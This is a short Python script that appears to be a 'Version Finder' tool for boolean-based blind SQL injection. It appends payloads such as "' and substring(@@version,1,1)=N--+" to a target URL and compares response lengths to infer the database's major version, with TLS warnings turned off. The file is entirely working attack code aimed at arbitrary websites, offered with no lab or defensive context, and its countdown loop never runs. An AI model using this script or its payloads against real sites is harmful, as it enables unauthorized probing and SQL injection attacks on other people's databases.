from colorama.ansi import Fore
import requests
import urllib3
import time
import os
from colorama import Fore


def start(url_input):
    urllib3.disable_warnings()
    # url_input = input(
    #     " # Version Finder\n --------------------\n Enter Your URL Here : ")

    # starting
    print(Fore.MAGENTA+" START [ ",end='')
    print(Fore.WHITE+url_input,end='')
    print(Fore.MAGENTA+" ]\n ----------------")

    # Requests
    test_url = f"{url_input}' and substring(@@version,1,1)=2--+"
    false_result = requests.get(test_url, verify=False).content
    false_Length = len(false_result)

    version = ['4', '5', '8', '1']
    for i in version:
        Flag = False
        url_right = f"{url_input}' and substring(@@version,1,1)={i}--+"
        result = requests.get(url_right, verify=False).content
        true_lenght = len(result)

        if true_lenght != false_Length:
            Flag = True
            print(Fore.LIGHTGREEN_EX +
                  f'\n Version Found : {i}.0.0'+Fore.RESET)
            break

        else:
            print(Fore.RED +
                  f'\n Version : {i}.0.0'+Fore.RESET)

    for i in range(6,0):
        print(f" Waiting {i} Secends...")
        time.sleep(1)